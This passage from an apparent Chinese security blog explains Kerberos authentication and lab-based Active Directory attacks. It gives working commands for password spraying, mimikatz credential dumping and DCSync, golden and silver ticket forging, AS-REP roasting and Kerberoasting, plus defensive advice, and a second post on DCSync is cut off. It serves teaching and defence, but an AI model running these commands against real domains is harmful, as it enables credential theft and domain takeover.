<h4 id="as-req">AS-REQ:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.请求的客户端信息
</span></span><span class="line"><span class="cl">3.加密类型
</span></span><span class="line"><span class="cl">4.Authenticator（用户Hash加密时间戳）
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/2.png" alt=""></p>
<p>客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。</p>
<h4 id="as-rep">AS-REP:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。
</span></span><span class="line"><span class="cl">2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。
</span></span><span class="line"><span class="cl">3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）
</span></span></code></pre></div><blockquote>
<p>Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/3.png" alt=""></p>
<h4 id="tgs-req">TGS-REQ:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.客户端信息
</span></span><span class="line"><span class="cl">2.Authenticator(Login Session Key加密时间戳)
</span></span><span class="line"><span class="cl">3.TGT认购权限
</span></span><span class="line"><span class="cl">4.访问的服务名
</span></span></code></pre></div><p><strong>因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。</strong></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/4.png" alt=""></p>
<p>padata：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/5.png" alt=""></p>
<p>req-body：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/6.png" alt=""></p>
<h4 id="tgs-rep">TGS-REP：</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.检查自身是否存在请求的服务，如果存在，通过krbtgt解密TGT并且得到Login Session Key，通过Login Session Key解密Authenticator(Login Session Key加密时间戳)，就验证了对方身份。然后验证时间戳是否在范围内，并且验证TGT中的时间戳是否过期，原始地址是否和TGT保存的地址相同等。
</span></span><span class="line"><span class="cl">2.生成用AS-REP得到的Login Session Key加密后的用于确保安全传输的Server Session Key。
</span></span><span class="line"><span class="cl">3.完成认证后，TGS生成ST票据，其中包括：客户端信息和原始的Server Session Key，整个ST票据由该服务的NTLM Hash加密。
</span></span><span class="line"><span class="cl">4.将ST和Server Session Key发送给客户端
</span></span></code></pre></div><p><code>DC并不会验证当前请求TGS的用户是否具有对其请求服务的访问权限，它只验证TGT是否有效，并基于TGT的信息制作对应的TGS。</code></p>
<h4 id="ap-req">AP-REQ:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.客户端收到TGS服务后，通过自己缓存的Login Session Key解密得到原始的Server Session Key，
</span></span><span class="line"><span class="cl">2.将ST和Authenticator（Server Session Key加密时间戳）发送给服务端。
</span></span><span class="line"><span class="cl">3.客户端访问服务，将PAC传递给服务进行检查；服务通过PAC查看用户的SID和用户组等并与服务自身的ACL进行对比。
</span></span><span class="line"><span class="cl">4.域控制器验证响应上的签名并将结果返回给服务器。该错误作为适当的RPC状态代码返回。
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/7.png" alt=""></p>
<hr>
<h4 id="ap-rep">AP-REP:</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.服务器验证AP-REQ，如果验证成功则发送AP-REP。
</span></span><span class="line"><span class="cl">2.通过服务的NTLM Hash解密ST，从中提取Server Session Key。
</span></span><span class="line"><span class="cl">3.通过提取出来的Server Session Key解密Authenticator，从而验证客户端身份。
</span></span><span class="line"><span class="cl">4.将Server Session Key加密时间戳为Authenticator发送给客户端，客户端用缓存的Server Session Key进行解密，如果解密成功则说明两方有相同的Server Session Key。
</span></span></code></pre></div><p><code>验证TGT中携带的PAC，KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较，最后决定是否给用户提供相应的服务</code></p>
<h3 id="pac的作用">PAC的作用</h3>
<p>只要用户通过预认证，拿到TGT，就能向TGS申请ST（kerberosat能利用的原因）。一切看起来好像合情合理，但是并没有判断用户是否拥有访问这个服务的权限，这就是PAC的作用。</p>
<p><code>PAC在AS-REP过程中放在TGT里加密发送给Client，当Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的SID、用户所在的组等信息传递给KDC。KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。</code></p>
<p>有些服务并没有验证PAC，白银票据因此得到利用。如果验证了PAC的话，就算攻击者拥有服务Hash，制作了ST票据，也不能制作PAC(PAC由两个数字签名构成，而这两个数字签名分别由Server NTLM Hash和KDC NTLM Hash加密)，并且只有KDC才能制作和查看PAC。</p>
<p>也恰恰是这个 PAC，造成了 MS14-068这个漏洞。该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC，普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。</p>
<h2 id="kerberos简要概括">kerberos简要概括</h2>
<hr>
<p>还是以上次使用域管与域控建立cifs的ipc连接为例</p>
<blockquote>
<p>net use \WIN-KONG\C$ password /u:hiro\administrator</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 用户使用该域管密码hash向域控制器 (DC) 进行身份验证。
</span></span><span class="line"><span class="cl">2. DC在ntds对比该用户hash是否正确，如果正确返回用户TGT票据和PAC等信息。
</span></span><span class="line"><span class="cl">3. 用户与域控建立cifs的ipc连接，在DC查询域控服务器的SPN。
</span></span><span class="line"><span class="cl">4. 识别出SPN后，与DC建立通信并返回TGT，以及用户需要通信的SPN(在这里是域控机器的SPN)。
</span></span><span class="line"><span class="cl">5. DC返回TGS票据给用户。
</span></span><span class="line"><span class="cl">6. 用户拿着TGS请求访问域控的cifs，DC解密TGS并检查认证用户的PAC(含sid和组等信息)，判断用户是否有权限访问该服务。
</span></span><span class="line"><span class="cl">7. 如果有访问该服务的权限，ipc连接成功，否则拒接连接。
</span></span></code></pre></div><h2 id="kerberos攻击面">kerberos攻击面</h2>
<h3 id="域用户枚举-密码喷洒kerbrute">域用户枚举 密码喷洒(kerbrute)</h3>
<p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示错误，当用户名存在时，密码正确或者错误返回包结果也不一样，所以可以尝试域用户枚举和密码喷洒攻击。</p>
<h4 id="条件能正常访问到目标域控的-389验证-和-88爆破-端口">条件：能正常访问到目标域控的 389(验证) 和 88(爆破) 端口</h4>
<p><code>#user.txt用户名文件格式不需要加@hiro.com</code></p>
<h4 id="域内用户枚举">域内用户枚举</h4>
<p>kerbrute：</p>
<p><code>kerbrute_windows_amd64.exe userenum -—dc 192.168.10.10 -d hiro.com user.txt     </code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/8.png" alt=""></p>
<p>nmap插件：</p>
<p><code>nmap -sT -Pn -p 88 —script krb5-enum-users —script-args krb5-enum-users.realm=“域名”,userdb=“users.txt” 域控IP</code></p>
<h4 id="密码喷洒--指定密码">密码喷洒  指定密码</h4>
<p><code>kerbrute_windows_amd64.exe passwordspray —dc 192.168.10.10 -d hiro.com user.txt 123456</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/9.png" alt=""></p>
<h4 id="域用户枚举密码喷洒攻击防范">域用户枚举、密码喷洒攻击防范</h4>
<p>审查域控日志</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 验证成功时产生日志(4768：请求了 Kerberos 身份验证票证 (TGT))
</span></span><span class="line"><span class="cl">2. 验证失败时产生日志(4771：Kerberos 预身份验证失败)
</span></span></code></pre></div><hr>
<h2 id="黄金白银票据">黄金&amp;白银票据</h2>
<p><code>黄金白银票据均可在任何机器上生成和使用，即使是未加入域的机器。（域外机器需要将DNS指向域控）</code></p>
<h3 id="黄金票据">黄金票据</h3>
<p>TGT由krbtgt用户Hash加密，如果拥有krbtgt用户Hash就可以制作任意用户的TGT，从而得到ST服务票据，进而访问域控。</p>
<h4 id="条件">条件</h4>
<p>要创建黄金票据，需要以下信息:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.域名
</span></span><span class="line"><span class="cl">2.域的SID值(域成员SID值去掉最后的)
</span></span><span class="line"><span class="cl">3.krbtgt账号的哈希值或AES-256值
</span></span><span class="line"><span class="cl">4.伪造的用户名
</span></span></code></pre></div><h4 id="1在域控上用mimikatz导出krbtgt用户hash">1.在域控上用mimikatz导出krbtgt用户hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:hiro.com /user:krbtgt
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/10.png" alt=""></p>
<h4 id="2利用mimikatz制作administrator的tgt票据">2.利用mimikatz制作administrator的TGT票据</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">kerberos::golden /user:administrator /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /krbtgt:5f468f6d7ac43c327396d832a0241d81 /ptt  
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/domain – 完全限定的域名。在本例中：“lab.adsecurity.org”。
</span></span><span class="line"><span class="cl">/sid – 域的 SID。在本例中：“S-1-5-21-1473643419-774954089-2222329127”。
</span></span><span class="line"><span class="cl">/sids – AD 林中帐户/组的其他 SID，具有您希望票证欺骗的权限。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的 Enterprise Admins 组。
</span></span><span class="line"><span class="cl">/user – 要模拟的用户名
</span></span><span class="line"><span class="cl">/groups（可选）– 用户所属的组 RID（第一个是主要组）。
</span></span><span class="line"><span class="cl">添加用户或计算机帐户 RID 以接收相同的访问权限。
</span></span><span class="line"><span class="cl">默认组为513。512,520,518,519 为知名管理员组（如下所列）。
</span></span><span class="line"><span class="cl">/krbtgt – 域 KDC 服务帐户 (KRBTGT) 的 NTLM 密码哈希。用于对 TGT 进行加密和签名。
</span></span><span class="line"><span class="cl">/ticket（可选） - 提供保存金票文件的路径和名称以备后用，或使用 /ptt 立即将金票注入内存以供使用。
</span></span><span class="line"><span class="cl">/ptt - 作为 /ticket 的替代 - 使用它可以立即将伪造的票据注入内存以供使用。
</span></span><span class="line"><span class="cl">/id（可选）——用户 RID。Mimikatz 默认为 500（默认管理员帐户 RID）。
</span></span><span class="line"><span class="cl">/startoffset（可选）——票证可用时的起始偏移量（如果使用此选项，通常设置为 –10 或 0）。Mimikatz 默认值为 0。
</span></span><span class="line"><span class="cl">/endin（可选）– 票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 10 小时（600 分钟）。
</span></span><span class="line"><span class="cl">/renewmax（可选）– 续订的最长票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 7 天（10,080 分钟）。
</span></span><span class="line"><span class="cl">/sids（可选）– 设置为 AD 林中 Enterprise Admins 组的 SID ([ADRootDomainSID]-519) 以欺骗整个 AD 林中的企业管理员权限（AD 林中每个域中的 AD 管理员）。
</span></span><span class="line"><span class="cl">/aes128 – AES128 密钥
</span></span><span class="line"><span class="cl">/aes256 – AES256 密钥
</span></span></code></pre></div><p>mimikatz输入kerberos::list查看该票据，或者在机器上cmd窗口输入klist(cmd需要以管理员权限运行)也能查到该票据</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/11.png" alt=""></p>
<p>用impacket中的ticketer.py生成</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/12.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/13.png" alt=""></p>
<h4 id="验证是否成功target需要指向fqdn">验证是否成功（target需要指向FQDN）：</h4>
<p>在Client端通过Psexec.exe工具来与域控进行连接</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/14.png" alt=""></p>
<p>或者直接建立ipc$连接</p>
<p><code>net use \\WIN-KONG.hiro.com\c$</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/15.png" alt=""></p>
<h4 id="黄金票据攻击防范">黄金票据攻击防范</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 将 TGS 请求与之前的 TGT 请求相关联，如果没有先前的 TGT 请求（在阈值内），则 TGS 请求可能与黄金票相关。
</span></span><span class="line"><span class="cl">2. 使用黄金票据能够在一个域环境中长时间控制整个域，并且日志无法溯源，最根本的办法是不允许域管账户登录其他服务器。
</span></span><span class="line"><span class="cl">3. 定期修改KRBTGT密码（重复修改两次），使得原有的票据失效。
</span></span></code></pre></div><h4 id="注为什么要连续修改两次">注：为什么要连续修改两次？</h4>
<blockquote>
<p>KRBTGT帐户被禁用并存储当前密码以及前一个密码。KRBTGT密码哈希用于在Kerberos票证中签署PAC以及加密TGT。如果票证使用不同的密钥（密码）签名/加密，则KDC需要检查KRBTGT以前的密码以查看是否成功。</p>
</blockquote>
<hr>
<h3 id="白银票据">白银票据</h3>
<p>ST由服务Hash加密，如果有了服务Hash，就可以签发任意用户的ST票据，不需要跟域控打交道，但是只能访问特定服务。</p>
<p>制作白银票据没有经过 AS-REQ / AS-REP，也没有与域控制器的 TGS-REQ / TGS-REP通信。因为 Silver Ticket 是伪造的 TGS，因此无法与域控制器通信。</p>
<p>大多数服务不验证 PAC，因此使用服务帐户密码哈希生成的有效 TGS 可以包含完全虚构的 PAC；伪造的白银票据没有带有效KDC签名的PAC，如果目标验证了KDC的PAC签名，那么白银票据就不起作用了。</p>
<p>要创建白银票据，需要以下信息:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.域名
</span></span><span class="line"><span class="cl">2.域的SID值(域成员SID值去掉最后的)
</span></span><span class="line"><span class="cl">3.目标服务的FQDN
</span></span><span class="line"><span class="cl">4.服务账号的HTLM哈希
</span></span></code></pre></div><p>利用白银票据伪造CIFS服务权限（CIFS服务常用于Windows主机之间的文件共享）</p>
<p>如果伪造HOST服务权限的话将获得目标计算机上涵盖的任何 Windows 服务的管理员权限。</p>
<h4 id="1在域控使用mimikatz获得域控的ntlm哈希">1.在域控使用mimikatz获得域控的NTLM哈希</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::Debug
</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/16.png" alt=""></p>
<h4 id="2利用mimikatz制作administrator指向域控的cifs服务的tgs票据">2.利用mimikatz制作administrator指向域控的cifs服务的TGS票据</h4>
<p><code>kerberos::golden /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /target:WIN-KONG.hiro.com /service:cifs /rc4:39107db5b42b1cfb9f3f38520bb4c0f3 /user:administrator /ptt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/domain – 完全限定的域名。在本例中：“lab.adsecurity.org”。
</span></span><span class="line"><span class="cl">/sid – 域的 SID。在本例中：“S-1-5-21-1473643419-774954089-2222329127”。
</span></span><span class="line"><span class="cl">/sids – AD 林中帐户/组的其他 SID，具有您希望票证欺骗的权限。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的 Enterprise Admins 组。
</span></span><span class="line"><span class="cl">/用户 – 要模拟的用户名
</span></span><span class="line"><span class="cl">/groups（可选）– 用户所属的组 RID（第一个是主要组）.  默认值为513。512,520,518,519 用于众所周知的管理员组。
</span></span><span class="line"><span class="cl">/ticket（可选） - 提供保存伪造票据文件的路径和名称以备后用或使用 /ptt 立即将黄金票据注入内存以供使用。
</span></span><span class="line"><span class="cl">/ptt - 作为 /ticket 的替代 - 使用它可以立即将伪造的票据注入内存以供使用。
</span></span><span class="line"><span class="cl">/id (可选) – 用户 RID。Mimikatz 默认为 500（默认管理员帐户 RID）。
</span></span><span class="line"><span class="cl">/startoffset（可选）——票证可用时的起始偏移量（如果使用此选项，通常设置为 –10 或 0）。Mimikatz 默认值为 0。
</span></span><span class="line"><span class="cl">/endin（可选）– 票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 10 小时（600 分钟）。
</span></span><span class="line"><span class="cl">/renewmax（可选）– 续订的最长票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 7 天（10,080 分钟）。
</span></span><span class="line"><span class="cl">/aes128 – AES128 密钥
</span></span><span class="line"><span class="cl">/aes256 – AES256 密钥
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/17.png" alt=""></p>
<p>在mimikatz上输入kerberos::list查看该票据，在机器上cmd窗口输入klist也能查到该票据</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/18.png" alt=""></p>
<h4 id="验证是否成功target需要指向fqdn-1">验证是否成功（target需要指向FQDN）</h4>
<p>在Client端通过Psexec.exe工具来与域控进行连接</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/19.png" alt=""></p>
<p>或者直接建立ipc$连接</p>
<p><code>net use \\WIN-KONG.hiro.com\c$</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/20.png" alt=""></p>
<h4 id="白银票据特点">白银票据特点</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.攻击者需要服务帐号密码哈希。
</span></span><span class="line"><span class="cl">2.TGS 是伪造的，因此没有关联的 TGT，这意味着永远不会联系 DC。
</span></span><span class="line"><span class="cl">3.事件日志都记录在目标服务器上。
</span></span></code></pre></div><p><code>所以虽然白银票据范围比黄金票据更有限，但所需的hash更容易获得并且使用时没有与DC通信，因此白银票据更难检测。</code></p>
<h4 id="白银票据攻击防范">白银票据攻击防范</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 尽量防止服务Hash不被窃取，并且开启PAC签名(PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效。)
</span></span><span class="line"><span class="cl">2. 但是如果开启PAC认证，会降低认证效率，增加DC的负担，最根本的还是要加固服务器本身对外的服务。
</span></span></code></pre></div><h4 id="黄金和白银票据的区别">黄金和白银票据的区别</h4>
<p>1.访问权限不同</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限
</span></span><span class="line"><span class="cl">Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限
</span></span></code></pre></div><p>2.加密方式不同</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket是由krbtgt的hash加密
</span></span><span class="line"><span class="cl">Silver Ticket是由服务账户（通常为计算机账户）hash加密
</span></span></code></pre></div><p>3.认证流程不同</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket在使用的过程需要同域控通信
</span></span><span class="line"><span class="cl">Silver Ticket在使用的过程不需要同域控通信
</span></span></code></pre></div><hr>
<h3 id="as-rep-roasting攻击">AS-REP Roasting攻击</h3>
<p>当关闭了预身份认证后，攻击者可以使用指定用户去请求票据，此时域控不会做任何验证就将TGT票据和该用户Hash加密的Login Session Key返回。所以只要对Login Session Key离线解密，就可以得到指定用户的明文密码。</p>
<p>enc-part是由用户密码Hash加密的，如果域用户设置了Do not require Kerberos preauthentication，可尝试爆破破解用户密码。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/21.png" alt=""></p>
<h4 id="利用">利用</h4>
<p>1.GetNPUsers.py</p>
<p><code>python3 GetNPUsers.py redteam.lab/zhuxin:'1qaz@WSX' -dc-ip 192.168.129.130 -request</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/22.png" alt=""></p>
<p>2.Rubeus</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">`Rubeus.exe asreproast`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">`Rubeus.exe asreproast /format:hashcat`
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/23.png" alt=""></p>
<p>使用hashcat对其进行爆破：</p>
<p>将hash.txt里面的除Hash字段其他的全删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5aasrep后面添加$23拼接。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/24.png" alt=""></p>
<p>然后使用以下命令爆破:</p>
<p><code>hashcat.exe -m 18200 hash.txt —force</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/25.png" alt=""></p>
<h4 id="as-rep-roasting攻击防范">AS-REP Roasting攻击防范</h4>
<p>不要勾选“Do not require Kerberos preauthentication”选项。</p>
<hr>
<h3 id="kerberoast攻击">kerberoast攻击</h3>
<p>kerberoast攻击发生在kerberos协议的TGS-REP阶段，返回的Enc-part由服务密码Hash加密，可以离线爆破爆破获得服务Hash，<code>不管用户对服务有没有访问权限，只要TGT正确就一定会返回ST</code>。</p>
<p>每个SPN在域中都是唯一的，并且在用户或者计算机账户中的ServicePrincipalName字段中注册。在TGS-REQ中攻击者可以指定他们支持的kerberos加密类型(RC4,AES256等)。</p>
<p>所有要走kerberos验证的服务,必须已事先注册好SPN,否则无法基于kerberos验证；而SPN又分两种：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.关联在机器账户下的,默认情况大多数基本都属这种,实际利用意义不大,计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令。
</span></span><span class="line"><span class="cl">2.被关联到某个域账户下，注册SPN成为服务方便域内认证。
</span></span></code></pre></div><p><code>如果攻击者TGT是有效的，则DC从TGT认购权证中提取信息并填充到ST中。然后KDC查看哪个账户在ServicePrincipalName字段中注册了所请求的SPN。ST服务票据使用攻击者所要求的SPN账户的NTLM哈希进行加密，并使用攻击者和服务账户共同商定的加密算法。ST以服务票据(TGS_REP)的形式发送回攻击者。</code></p>
<h4 id="查看当前域所有的spn">查看当前域所有的SPN：</h4>
<p><code>setspn  -Q */*</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/26.png" alt=""></p>
<h4 id="利用-1">利用</h4>
<p>1.Rubeus:</p>
<p>打印出注册域用户下的所有SPN的服务票据的hashcat格式</p>
<p><code>Rubeus.exe kerberoast </code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/27.png" alt=""></p>
<p>将导出来的hashcat格式的哈希保存为hash.txt，放到hashcat目录下进行解密</p>
<p><code>hashcat64.exe -m  13100  hash.txt  pass.txt</code></p>
<p>2.GetUserSPNs.py</p>
<p><code>python3 GetUserSPNs.py redteam.lab/zhuxin:1qaz@WSX -dc-ip 192.168.129.130 -request</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/28.png" alt=""></p>
<p>将导出来的hashcat格式的哈希保存为hash.txt，放到hashcat目录下进行解密</p>
<p><code>hashcat64.exe -m 13100 hash.txt pass.txt</code></p>
<h4 id="kerberoast攻击防范">Kerberoast攻击防范</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.保证密码复杂度
</span></span><span class="line"><span class="cl">2.强制使用AES256对kerberos进行加密
</span></span><span class="line"><span class="cl">3.监控ID为4679(请求Kerberos服务票据)的事件
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Dcsync</title>
            <link>https://lzzbb.github.io/posts/2021/01/dcsync/</link>
            <pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/01/dcsync/</guid>
            <description>Dcsync简介 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。
新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。
当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。
默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。
域对象只需要具备一下这两个权限，就有dcsync的权限
‘DS-Replication-Get-Changes’ = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 ‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 利用条件  域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）    域控制器的计算机用户
  拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限
  利用方式： 拥有上述条件的任意用户权限，即可导出域内任意用户的hash
mimikatz 导出administrator用户的Hash
域内
lsadump::dcsync /domain:hiro.com /user:administrator 
域外
lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&amp;quot;&amp;quot; /authntlm
域控导出所有域用户的哈希
privilege::debug lsadump::dcsync /domain:hiro.com /all /csv 其他机器读取域内密码hash</description>
            <content type="html"><![CDATA[<h2 id="dcsync简介">Dcsync简介</h2>
<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
<p>新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。</p>
<p>当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。</p>
<p><code>默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。</code></p>
<p>域对象只需要具备一下这两个权限，就有dcsync的权限</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‘DS-Replication-Get-Changes’     = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
</span></span><span class="line"><span class="cl">‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/1.png" alt=""></p>
<h3 id="利用条件">利用条件</h3>
<ol>
<li>域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/2.jpg" alt=""></p>
<ol>
<li>
<p>域控制器的计算机用户</p>
</li>
<li>
<p>拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限</p>
</li>
</ol>
<h3 id="利用方式">利用方式：</h3>
